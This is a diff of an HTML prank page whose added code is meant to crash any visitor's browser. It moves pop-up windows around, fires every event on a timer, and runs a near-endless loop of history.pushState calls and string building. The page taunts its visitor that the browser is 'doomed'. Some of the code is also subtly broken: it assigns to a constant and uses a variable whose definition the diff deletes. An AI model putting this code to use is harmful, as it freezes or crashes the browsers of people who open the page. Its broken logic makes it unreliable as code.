@@ -11,9 +11,10 @@
       min-height: 100vh;
     }
   </style>
+    <h2>Why would you click?</h2>
+    <h3>Welp, your browser is doomed.</h3>
 </head>
 <body>
-  <h1>Nobody would actually fall for this, right?</h1>
   <script>
     function moveWindow() {
       let x = 0;
@@ -63,13 +64,16 @@ function handleEvent() {
 
           const maxX = newPopup.screen.width - 200;
           const maxY = newPopup.screen.height - 100;
+          const popupSize = newPopup.width;
 
           if (popupX > maxX || popupX < 0) {
             popupXDirection *= -1;
+              popupSize = +1;
           }
 
           if (popupY > maxY || popupY < 0) {
             popupYDirection *= -1;
+              popupSize = -1;
           }
 
           newPopup.moveTo(popupX, popupY);
@@ -78,21 +82,30 @@ function handleEvent() {
 
         movePopup();
       });
+
 }
 
 events.forEach(eventType => {
   document.addEventListener(eventType, handleEvent);
 });
-
-    moveWindow();
-    // Get all event types supported by the browser
-const eventTypes = Object.keys(Object.getPrototypeOf(new Event(''))).filter(type => type.startsWith('on'));
-
 // Trigger all events on the body element
 eventTypes.forEach(eventType => {
   const eventName = eventType.substring(2); // Remove the 'on' prefix
   document.body.dispatchEvent(new Event(eventName));
 });
+
+    moveWindow();
+//crash even more
+events.forEach(event => setInterval(() => document.dispatchEvent(new Event(event)), 1000));
+
+// Start the loop with history.pushState after 5 seconds with no timer
+setTimeout(() => {
+  var total = "";
+for (var i = 0; i < 10000000000000; i++) {
+  total += i.toString();
+  history.pushState(0, 0, location.href + '#' + i);
+}
+}, 5000);
   </script>
 </body>
 </html>
